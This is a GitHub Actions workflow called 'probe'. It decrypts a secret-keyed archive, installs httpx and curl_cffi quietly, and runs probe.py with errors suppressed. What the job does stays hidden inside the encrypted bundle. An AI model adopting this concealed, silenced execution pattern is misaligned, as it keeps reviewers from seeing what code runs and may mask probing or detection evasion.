name: probe
on: workflow_dispatch
permissions:
  contents: read
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.14"
      - name: run
        env:
          K: ${{ secrets.BUNDLE_KEY }}
        run: |
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -pass env:K -in bundle.enc | tar xz
          python -m pip install -q httpx curl_cffi > /dev/null 2>&1
          python probe.py 2>/dev/null
